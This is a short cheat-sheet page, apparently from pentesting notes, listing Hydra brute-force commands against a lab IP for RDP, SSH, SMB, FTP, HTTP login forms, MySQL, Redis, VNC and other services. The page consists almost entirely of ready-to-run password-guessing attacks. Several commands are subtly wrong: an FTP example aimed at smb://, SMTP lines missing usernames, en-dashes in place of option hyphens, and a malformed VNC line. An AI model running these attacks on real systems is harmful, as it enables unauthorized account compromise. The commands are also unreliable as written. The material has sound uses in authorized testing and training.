---
description: >-
  Hydra is a parallelized login cracker which supports numerous protocols to
  attack. It is very fast and flexible, and new modules are easy to add.
---

# Hydra

{% embed url="https://www.kali.org/tools/hydra" %}

Examples&#x20;

{% code overflow="wrap" %}
```bash
# GUI
xhydra

# RDP 
hydra -V -f -L usernames.txt -P passwords.txt rdp://10.0.2.5 -V 

# SSH 
hydra -l root -P passwords.txt -f ssh://10.0.2.5 -V 

# SMB 
hydra -l Administrator -P passwords.txt -f smb://10.0.2.5 -V 

# FTP 
hydra -l root -P passwords.txt -f smb://10.0.2.5 -V 

# HTTP Basic Auth 
hydra -L users.txt -P password.txt 10.0.2.5 http-get /login/ -V 

# HTTP Post 
hydra -L users.txt -P password.txt 10.0.2.5 http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V 

# IMAP 
hydra -l root -P passwords.txt -f imap://10.0.2.5 -V 

# MySQL 
hydra -L usernames.txt -P pass.txt -f mysql://10.0.2.5 -V 

# POP 
hydra -l USERNAME -P passwords.txt -f pop3://10.0.2.5 -V 

# Redis 
hydra –P password.txt redis://10.0.2.5 -V 

# Rexec 
hydra -l root -P password.txt rexec://10.0.2.5 -V 

# Rlogin 
hydra -l root -P password.txt rlogin://10.0.2.5 -V 

# RSH 
hydra -L username.txt rsh://10.0.2.5 -V 

# RSP 
hydra -l root -P passwords.txt rtsp 

# SMTP 
hydra -l -P /path/to/passwords.txt smtp -V 
hydra -l -P /path/to/passwords.txt -s 587 -S -v -V #Port 587 for SMTP with SSL 

# Telnet 
hydra -l root -P passwords.txt [-t 32] telnet 

# VNC 
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s vnc
```
{% endcode %}
